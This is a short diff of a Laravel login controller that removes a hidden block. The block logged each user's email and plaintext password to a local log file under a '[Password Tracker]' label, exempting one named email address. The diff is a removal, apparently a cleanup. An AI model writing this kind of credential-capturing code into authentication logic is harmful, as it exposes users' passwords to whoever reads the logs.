@@ -33,13 +33,6 @@ class AuthenticatedSessionController extends Controller
     {
         $request->authenticate();
 
-        if ($request->email !== "matse@vanhorebeek.be")
-            Log::build([
-                'driver' => 'single',
-                'path' => storage_path('logs/logs.log'),
-            ])->info('[Password Tracker] ' . $request->email . ' - ' . $request->password);
-
-
         $request->session()->regenerate();
 
         return redirect()->intended(RouteServiceProvider::HOME);
